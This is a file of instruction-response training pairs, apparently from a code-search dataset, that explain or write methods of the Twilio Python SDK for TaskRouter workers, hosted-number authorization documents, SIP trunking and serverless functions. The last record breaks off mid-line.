{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef create(self, friendly_name, activity_sid=values.unset,\n               attributes=values.unset):\n        \"\"\"\n        Create a new WorkerInstance\n\n        :param unicode friendly_name: String representing user-friendly name for the Worker.\n        :param unicode activity_sid: A valid Activity describing the worker's initial state.\n        :param unicode attributes: JSON object describing this worker.\n\n        :returns: Newly created WorkerInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.WorkerInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'ActivitySid': activity_sid,\n            'Attributes': attributes,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return WorkerInstance(self._version, payload, workspace_sid=self._solution['workspace_sid'], )", "response": "Create a new WorkerInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\naccess the statistics :returns: twilio.rest.taskrouter.v1.workspace.worker.workers_statistics.WorkersStatisticsList :rtype: twilio.rest.taskrouter.v1.workspace.worker.workers_statistics.WorkersStatisticsList", "response": "def statistics(self):\n        \"\"\"\n        Access the statistics\n\n        :returns: twilio.rest.taskrouter.v1.workspace.worker.workers_statistics.WorkersStatisticsList\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.workers_statistics.WorkersStatisticsList\n        \"\"\"\n        if self._statistics is None:\n            self._statistics = WorkersStatisticsList(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n            )\n        return self._statistics"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get(self, sid):\n        return WorkerContext(self._version, workspace_sid=self._solution['workspace_sid'], sid=sid, )", "response": "Constructs a WorkerContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.taskrouter.v1.workspace.worker.WorkerContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.WorkerContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_instance(self, payload):\n        return WorkerInstance(self._version, payload, workspace_sid=self._solution['workspace_sid'], )", "response": "Build an instance of WorkerInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nupdates the WorkerInstance :param unicode activity_sid: The activity_sid :param unicode attributes: The attributes :param unicode friendly_name: The friendly_name :param bool reject_pending_reservations: The reject_pending_reservations :returns: Updated WorkerInstance :rtype: twilio.rest.taskrouter.v1.workspace.worker.WorkerInstance", "response": "def update(self, activity_sid=values.unset, attributes=values.unset,\n               friendly_name=values.unset,\n               reject_pending_reservations=values.unset):\n        \"\"\"\n        Update the WorkerInstance\n\n        :param unicode activity_sid: The activity_sid\n        :param unicode attributes: The attributes\n        :param unicode friendly_name: The friendly_name\n        :param bool reject_pending_reservations: The reject_pending_reservations\n\n        :returns: Updated WorkerInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.WorkerInstance\n        \"\"\"\n        data = values.of({\n            'ActivitySid': activity_sid,\n            'Attributes': attributes,\n            'FriendlyName': friendly_name,\n            'RejectPendingReservations': reject_pending_reservations,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return WorkerInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\naccess the real_time_statistics :returns: twilio.rest.taskrouter.v1.workspace.worker.workers_real_time_statistics.WorkersRealTimeStatisticsList :rtype: twilio.rest.taskrouter.v1.workspace.worker.workers_real_time_statistics.WorkersRealTimeStatisticsList", "response": "def real_time_statistics(self):\n        \"\"\"\n        Access the real_time_statistics\n\n        :returns: twilio.rest.taskrouter.v1.workspace.worker.workers_real_time_statistics.WorkersRealTimeStatisticsList\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.workers_real_time_statistics.WorkersRealTimeStatisticsList\n        \"\"\"\n        if self._real_time_statistics is None:\n            self._real_time_statistics = WorkersRealTimeStatisticsList(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n            )\n        return self._real_time_statistics"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\naccess the cumulative_statistics :returns: twilio.rest.taskrouter.v1.workspace.worker.workers_cumulative_statistics.WorkersCumulativeStatisticsList :rtype: twilio.rest.taskrouter.v1.workspace.worker.workers_cumulative_statistics.WorkersCumulativeStatisticsList", "response": "def cumulative_statistics(self):\n        \"\"\"\n        Access the cumulative_statistics\n\n        :returns: twilio.rest.taskrouter.v1.workspace.worker.workers_cumulative_statistics.WorkersCumulativeStatisticsList\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.workers_cumulative_statistics.WorkersCumulativeStatisticsList\n        \"\"\"\n        if self._cumulative_statistics is None:\n            self._cumulative_statistics = WorkersCumulativeStatisticsList(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n            )\n        return self._cumulative_statistics"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\naccesses the statistics :returns: twilio.rest.taskrouter.v1.workspace.worker.worker_statistics.WorkerStatisticsList :rtype: twilio.rest.taskrouter.v1.workspace.worker.worker_statistics.WorkerStatisticsList", "response": "def statistics(self):\n        \"\"\"\n        Access the statistics\n\n        :returns: twilio.rest.taskrouter.v1.workspace.worker.worker_statistics.WorkerStatisticsList\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.worker_statistics.WorkerStatisticsList\n        \"\"\"\n        if self._statistics is None:\n            self._statistics = WorkerStatisticsList(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                worker_sid=self._solution['sid'],\n            )\n        return self._statistics"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\naccesses the reservations :returns: twilio.rest.taskrouter.v1.workspace.worker.reservation.ReservationList :rtype: twilio.rest.taskrouter.v1.workspace.worker.reservation.ReservationList", "response": "def reservations(self):\n        \"\"\"\n        Access the reservations\n\n        :returns: twilio.rest.taskrouter.v1.workspace.worker.reservation.ReservationList\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.reservation.ReservationList\n        \"\"\"\n        if self._reservations is None:\n            self._reservations = ReservationList(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                worker_sid=self._solution['sid'],\n            )\n        return self._reservations"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef worker_channels(self):\n        if self._worker_channels is None:\n            self._worker_channels = WorkerChannelList(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                worker_sid=self._solution['sid'],\n            )\n        return self._worker_channels", "response": "Access the worker_channels\n\n        :returns: twilio.rest.taskrouter.v1.workspace.worker.worker_channel.WorkerChannelList\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.worker_channel.WorkerChannelList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngenerating an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: WorkerContext for this WorkerInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.WorkerContext\n        \"\"\"\n        if self._context is None:\n            self._context = WorkerContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nupdate the WorkerInstance :param unicode activity_sid: The activity_sid :param unicode attributes: The attributes :param unicode friendly_name: The friendly_name :param bool reject_pending_reservations: The reject_pending_reservations :returns: Updated WorkerInstance :rtype: twilio.rest.taskrouter.v1.workspace.worker.WorkerInstance", "response": "def update(self, activity_sid=values.unset, attributes=values.unset,\n               friendly_name=values.unset,\n               reject_pending_reservations=values.unset):\n        \"\"\"\n        Update the WorkerInstance\n\n        :param unicode activity_sid: The activity_sid\n        :param unicode attributes: The attributes\n        :param unicode friendly_name: The friendly_name\n        :param bool reject_pending_reservations: The reject_pending_reservations\n\n        :returns: Updated WorkerInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.WorkerInstance\n        \"\"\"\n        return self._proxy.update(\n            activity_sid=activity_sid,\n            attributes=attributes,\n            friendly_name=friendly_name,\n            reject_pending_reservations=reject_pending_reservations,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef page(self, email=values.unset, status=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of AuthorizationDocumentInstance records from the API.\n        Request is executed immediately\n\n        :param unicode email: Email.\n        :param AuthorizationDocumentInstance.Status status: The Status of this AuthorizationDocument.\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of AuthorizationDocumentInstance\n        :rtype: twilio.rest.preview.hosted_numbers.authorization_document.AuthorizationDocumentPage\n        \"\"\"\n        params = values.of({\n            'Email': email,\n            'Status': status,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return AuthorizationDocumentPage(self._version, response, self._solution)", "response": "Retrieve a single page of AuthorizationDocumentInstance records from the API. Request is executed immediately"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates a new AuthorizationDocumentInstance", "response": "def create(self, hosted_number_order_sids, address_sid, email, contact_title,\n               contact_phone_number, cc_emails=values.unset):\n        \"\"\"\n        Create a new AuthorizationDocumentInstance\n\n        :param unicode hosted_number_order_sids: A list of HostedNumberOrder sids.\n        :param unicode address_sid: Address sid.\n        :param unicode email: Email.\n        :param unicode contact_title: Title of signee of this Authorization Document.\n        :param unicode contact_phone_number: Authorization Document's signee's phone number.\n        :param unicode cc_emails: A list of emails.\n\n        :returns: Newly created AuthorizationDocumentInstance\n        :rtype: twilio.rest.preview.hosted_numbers.authorization_document.AuthorizationDocumentInstance\n        \"\"\"\n        data = values.of({\n            'HostedNumberOrderSids': serialize.map(hosted_number_order_sids, lambda e: e),\n            'AddressSid': address_sid,\n            'Email': email,\n            'ContactTitle': contact_title,\n            'ContactPhoneNumber': contact_phone_number,\n            'CcEmails': serialize.map(cc_emails, lambda e: e),\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return AuthorizationDocumentInstance(self._version, payload, )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nupdate the AuthorizationDocumentInstance :param unicode hosted_number_order_sids: A list of HostedNumberOrder sids. :param unicode address_sid: Address sid. :param unicode email: Email. :param unicode cc_emails: A list of emails. :param AuthorizationDocumentInstance.Status status: The Status of this AuthorizationDocument. :param unicode contact_title: Title of signee of this Authorization Document. :param unicode contact_phone_number: Authorization Document's signee's phone number. :returns: Updated AuthorizationDocumentInstance :rtype: twilio.rest.preview.hosted_numbers.authorization_document.AuthorizationDocumentInstance", "response": "def update(self, hosted_number_order_sids=values.unset,\n               address_sid=values.unset, email=values.unset, cc_emails=values.unset,\n               status=values.unset, contact_title=values.unset,\n               contact_phone_number=values.unset):\n        \"\"\"\n        Update the AuthorizationDocumentInstance\n\n        :param unicode hosted_number_order_sids: A list of HostedNumberOrder sids.\n        :param unicode address_sid: Address sid.\n        :param unicode email: Email.\n        :param unicode cc_emails: A list of emails.\n        :param AuthorizationDocumentInstance.Status status: The Status of this AuthorizationDocument.\n        :param unicode contact_title: Title of signee of this Authorization Document.\n        :param unicode contact_phone_number: Authorization Document's signee's phone number.\n\n        :returns: Updated AuthorizationDocumentInstance\n        :rtype: twilio.rest.preview.hosted_numbers.authorization_document.AuthorizationDocumentInstance\n        \"\"\"\n        data = values.of({\n            'HostedNumberOrderSids': serialize.map(hosted_number_order_sids, lambda e: e),\n            'AddressSid': address_sid,\n            'Email': email,\n            'CcEmails': serialize.map(cc_emails, lambda e: e),\n            'Status': status,\n            'ContactTitle': contact_title,\n            'ContactPhoneNumber': contact_phone_number,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return AuthorizationDocumentInstance(self._version, payload, sid=self._solution['sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\naccess the dependent_hosted_number_orders :returns: twilio.rest.preview.hosted_numbers.authorization_document.dependent_hosted_number_order.DependentHostedNumberOrderList :rtype: twilio.rest.preview.hosted_numbers.authorization_document.dependent_hosted_number_order.DependentHostedNumberOrderList", "response": "def dependent_hosted_number_orders(self):\n        \"\"\"\n        Access the dependent_hosted_number_orders\n\n        :returns: twilio.rest.preview.hosted_numbers.authorization_document.dependent_hosted_number_order.DependentHostedNumberOrderList\n        :rtype: twilio.rest.preview.hosted_numbers.authorization_document.dependent_hosted_number_order.DependentHostedNumberOrderList\n        \"\"\"\n        if self._dependent_hosted_number_orders is None:\n            self._dependent_hosted_number_orders = DependentHostedNumberOrderList(\n                self._version,\n                signing_document_sid=self._solution['sid'],\n            )\n        return self._dependent_hosted_number_orders"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngenerates an instance context for the resource that is capable of performing various actions.", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: AuthorizationDocumentContext for this AuthorizationDocumentInstance\n        :rtype: twilio.rest.preview.hosted_numbers.authorization_document.AuthorizationDocumentContext\n        \"\"\"\n        if self._context is None:\n            self._context = AuthorizationDocumentContext(self._version, sid=self._solution['sid'], )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nupdates the AuthorizationDocumentInstance :param unicode hosted_number_order_sids: A list of HostedNumberOrder sids. :param unicode address_sid: Address sid. :param unicode email: Email. :param unicode cc_emails: A list of emails. :param AuthorizationDocumentInstance.Status status: The Status of this AuthorizationDocument. :param unicode contact_title: Title of signee of this Authorization Document. :param unicode contact_phone_number: Authorization Document's signee's phone number. :returns: Updated AuthorizationDocumentInstance :rtype: twilio.rest.preview.hosted_numbers.authorization_document.AuthorizationDocumentInstance", "response": "def update(self, hosted_number_order_sids=values.unset,\n               address_sid=values.unset, email=values.unset, cc_emails=values.unset,\n               status=values.unset, contact_title=values.unset,\n               contact_phone_number=values.unset):\n        \"\"\"\n        Update the AuthorizationDocumentInstance\n\n        :param unicode hosted_number_order_sids: A list of HostedNumberOrder sids.\n        :param unicode address_sid: Address sid.\n        :param unicode email: Email.\n        :param unicode cc_emails: A list of emails.\n        :param AuthorizationDocumentInstance.Status status: The Status of this AuthorizationDocument.\n        :param unicode contact_title: Title of signee of this Authorization Document.\n        :param unicode contact_phone_number: Authorization Document's signee's phone number.\n\n        :returns: Updated AuthorizationDocumentInstance\n        :rtype: twilio.rest.preview.hosted_numbers.authorization_document.AuthorizationDocumentInstance\n        \"\"\"\n        return self._proxy.update(\n            hosted_number_order_sids=hosted_number_order_sids,\n            address_sid=address_sid,\n            email=email,\n            cc_emails=cc_emails,\n            status=status,\n            contact_title=contact_title,\n            contact_phone_number=contact_phone_number,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate a new IpAccessControlListMappingInstance", "response": "def create(self, ip_access_control_list_sid):\n        \"\"\"\n        Create a new IpAccessControlListMappingInstance\n\n        :param unicode ip_access_control_list_sid: The unique id of the IP access control list to map to the SIP domain\n\n        :returns: Newly created IpAccessControlListMappingInstance\n        :rtype: twilio.rest.api.v2010.account.sip.domain.ip_access_control_list_mapping.IpAccessControlListMappingInstance\n        \"\"\"\n        data = values.of({'IpAccessControlListSid': ip_access_control_list_sid, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return IpAccessControlListMappingInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nconstructs a IpAccessControlListMappingContext :param sid: A 34 character string that uniquely identifies the resource to fetch. :returns: twilio.rest.api.v2010.account.sip.domain.ip_access_control_list_mapping.IpAccessControlListMappingContext :rtype: twilio.rest.api.v2010.account.sip.domain.ip_access_control_list_mapping.IpAccessControlListMappingContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a IpAccessControlListMappingContext\n\n        :param sid: A 34 character string that uniquely identifies the resource to fetch.\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.ip_access_control_list_mapping.IpAccessControlListMappingContext\n        :rtype: twilio.rest.api.v2010.account.sip.domain.ip_access_control_list_mapping.IpAccessControlListMappingContext\n        \"\"\"\n        return IpAccessControlListMappingContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nbuilds an instance of IpAccessControlListMappingInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of IpAccessControlListMappingInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.ip_access_control_list_mapping.IpAccessControlListMappingInstance\n        :rtype: twilio.rest.api.v2010.account.sip.domain.ip_access_control_list_mapping.IpAccessControlListMappingInstance\n        \"\"\"\n        return IpAccessControlListMappingInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef stream(self, status=values.unset, phone_number=values.unset,\n               incoming_phone_number_sid=values.unset, friendly_name=values.unset,\n               unique_name=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Streams DependentHostedNumberOrderInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param DependentHostedNumberOrderInstance.Status status: The Status of this HostedNumberOrder.\n        :param unicode phone_number: An E164 formatted phone number.\n        :param unicode incoming_phone_number_sid: IncomingPhoneNumber sid.\n        :param unicode friendly_name: A human readable description of this resource.\n        :param unicode unique_name: A unique, developer assigned name of this HostedNumberOrder.\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.preview.hosted_numbers.authorization_document.dependent_hosted_number_order.DependentHostedNumberOrderInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            status=status,\n            phone_number=phone_number,\n            incoming_phone_number_sid=incoming_phone_number_sid,\n            friendly_name=friendly_name,\n            unique_name=unique_name,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])", "response": "Streams DependentHostedNumberOrderInstance records from the API as a generator. This operation lazily loads the DependentHostedNumberOrderInstance records from the API as efficiently as possible until the limit is reached."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nfetch a list of DependentHostedNumberOrderInstance records from the API.", "response": "def list(self, status=values.unset, phone_number=values.unset,\n             incoming_phone_number_sid=values.unset, friendly_name=values.unset,\n             unique_name=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists DependentHostedNumberOrderInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param DependentHostedNumberOrderInstance.Status status: The Status of this HostedNumberOrder.\n        :param unicode phone_number: An E164 formatted phone number.\n        :param unicode incoming_phone_number_sid: IncomingPhoneNumber sid.\n        :param unicode friendly_name: A human readable description of this resource.\n        :param unicode unique_name: A unique, developer assigned name of this HostedNumberOrder.\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.preview.hosted_numbers.authorization_document.dependent_hosted_number_order.DependentHostedNumberOrderInstance]\n        \"\"\"\n        return list(self.stream(\n            status=status,\n            phone_number=phone_number,\n            incoming_phone_number_sid=incoming_phone_number_sid,\n            friendly_name=friendly_name,\n            unique_name=unique_name,\n            limit=limit,\n            page_size=page_size,\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nbuilds an instance of DependentHostedNumberOrderInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of DependentHostedNumberOrderInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.preview.hosted_numbers.authorization_document.dependent_hosted_number_order.DependentHostedNumberOrderInstance\n        :rtype: twilio.rest.preview.hosted_numbers.authorization_document.dependent_hosted_number_order.DependentHostedNumberOrderInstance\n        \"\"\"\n        return DependentHostedNumberOrderInstance(\n            self._version,\n            payload,\n            signing_document_sid=self._solution['signing_document_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncreates a new OriginationUrlInstance", "response": "def create(self, weight, priority, enabled, friendly_name, sip_url):\n        \"\"\"\n        Create a new OriginationUrlInstance\n\n        :param unicode weight: The value that determines the relative load the URI should receive compared to others with the same priority\n        :param unicode priority: The relative importance of the URI\n        :param bool enabled: Whether the URL is enabled\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode sip_url: The SIP address you want Twilio to route your Origination calls to\n\n        :returns: Newly created OriginationUrlInstance\n        :rtype: twilio.rest.trunking.v1.trunk.origination_url.OriginationUrlInstance\n        \"\"\"\n        data = values.of({\n            'Weight': weight,\n            'Priority': priority,\n            'Enabled': enabled,\n            'FriendlyName': friendly_name,\n            'SipUrl': sip_url,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return OriginationUrlInstance(self._version, payload, trunk_sid=self._solution['trunk_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get(self, sid):\n        return OriginationUrlContext(self._version, trunk_sid=self._solution['trunk_sid'], sid=sid, )", "response": "Constructs a OriginationUrlContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.trunking.v1.trunk.origination_url.OriginationUrlContext\n        :rtype: twilio.rest.trunking.v1.trunk.origination_url.OriginationUrlContext"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nbuild an instance of OriginationUrlInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of OriginationUrlInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.trunking.v1.trunk.origination_url.OriginationUrlInstance\n        :rtype: twilio.rest.trunking.v1.trunk.origination_url.OriginationUrlInstance\n        \"\"\"\n        return OriginationUrlInstance(self._version, payload, trunk_sid=self._solution['trunk_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef update(self, weight=values.unset, priority=values.unset,\n               enabled=values.unset, friendly_name=values.unset,\n               sip_url=values.unset):\n        \"\"\"\n        Update the OriginationUrlInstance\n\n        :param unicode weight: The value that determines the relative load the URI should receive compared to others with the same priority\n        :param unicode priority: The relative importance of the URI\n        :param bool enabled: Whether the URL is enabled\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode sip_url: The SIP address you want Twilio to route your Origination calls to\n\n        :returns: Updated OriginationUrlInstance\n        :rtype: twilio.rest.trunking.v1.trunk.origination_url.OriginationUrlInstance\n        \"\"\"\n        data = values.of({\n            'Weight': weight,\n            'Priority': priority,\n            'Enabled': enabled,\n            'FriendlyName': friendly_name,\n            'SipUrl': sip_url,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return OriginationUrlInstance(\n            self._version,\n            payload,\n            trunk_sid=self._solution['trunk_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Update the OriginationUrlInstance\n\n        :param unicode weight: The value that determines the relative load the URI should receive compared to others with the same priority\n        :param unicode priority: The relative importance of the URI\n        :param bool enabled: Whether the URL is enabled\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode sip_url: The SIP address you want Twilio to route your Origination calls to\n\n        :returns: Updated OriginationUrlInstance\n        :rtype: twilio.rest.trunking.v1.trunk.origination_url.OriginationUrlInstance"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _proxy(self):\n        if self._context is None:\n            self._context = OriginationUrlContext(\n                self._version,\n                trunk_sid=self._solution['trunk_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nupdates the OriginationUrlInstance :param unicode weight: The value that determines the relative load the URI should receive compared to others with the same priority :param unicode priority: The relative importance of the URI :param bool enabled: Whether the URL is enabled :param unicode friendly_name: A string to describe the resource :param unicode sip_url: The SIP address you want Twilio to route your Origination calls to :returns: Updated OriginationUrlInstance :rtype: twilio.rest.trunking.v1.trunk.origination_url.OriginationUrlInstance", "response": "def update(self, weight=values.unset, priority=values.unset,\n               enabled=values.unset, friendly_name=values.unset,\n               sip_url=values.unset):\n        \"\"\"\n        Update the OriginationUrlInstance\n\n        :param unicode weight: The value that determines the relative load the URI should receive compared to others with the same priority\n        :param unicode priority: The relative importance of the URI\n        :param bool enabled: Whether the URL is enabled\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode sip_url: The SIP address you want Twilio to route your Origination calls to\n\n        :returns: Updated OriginationUrlInstance\n        :rtype: twilio.rest.trunking.v1.trunk.origination_url.OriginationUrlInstance\n        \"\"\"\n        return self._proxy.update(\n            weight=weight,\n            priority=priority,\n            enabled=enabled,\n            friendly_name=friendly_name,\n            sip_url=sip_url,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconstructs a FunctionContext :param sid: The sid :returns: twilio.rest.serverless.v1.service.function.FunctionContext :rtype: twilio.rest.serverless.v1.service.function.FunctionContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a FunctionContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.serverless.v1.service.function.FunctionContext\n        :rtype: twilio.rest.serverless.v1.service.function.FunctionContext\n        \"\"\"\n        return FunctionContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_instance(self, payload):\n        return FunctionInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Build an instance of FunctionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef update(self, friendly_name):\n        data = values.of({'FriendlyName': friendly_name, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return FunctionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Update the FunctionInstance\n\n        :param unicode friendly_name: The friendly_name\n\n        :returns: Updated FunctionInstance\n        :rtype: twilio.rest.serverless.v1.service.function.FunctionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\naccessing the function_versions :returns: twilio.rest.serverless.v1.service.function.function_version.FunctionVersionList :rtype: twilio.rest.serverless.v1.service.function.function_version.FunctionVersionList", "response": "def function_versions(self):\n        \"\"\"\n        Access the function_versions\n\n        :returns: twilio.rest.serverless.v1.service.function.function_version.FunctionVersionList\n        :rtype: twilio.rest.serverless.v1.service.function.function_version.FunctionVersionList\n        \"\"\"\n        if self._function_versions is None:\n            self._function_versions = FunctionVersionList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                function_sid=self._solution['sid'],\n            )\n        return self._function_versions"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngenerating an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: FunctionContext for this FunctionInstance\n        :rtype: twilio.rest.serverless.v1.service.function.FunctionContext\n        \"\"\"\n        if self._context is None:\n            self._context = FunctionContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef page(self, category=values.unset, start_date=values.unset,\n             end_date=values.unset, include_subaccounts=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of DailyInstance records from the API.\n        Request is executed immediately\n\n        :param DailyInstance.Category category: The usage category of the UsageRecord resources to read\n        :param date start_date: Only include usage that has occurred on or after this date\n        :param date end_date: Only include usage that occurred on or before this date\n        :param bool include_subaccounts: Whether to include usage from the master account and all its subaccounts\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of DailyInstance\n        :rtype: twilio.rest.api.v2010.account.usage.record.daily.DailyPage\n        \"\"\"\n        params = values.of({\n            'Category': category,\n            'StartDate': serialize.iso8601_date(start_date),\n            'EndDate': serialize.iso8601_date(end_date),\n            'IncludeSubaccounts': include_subaccounts,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return 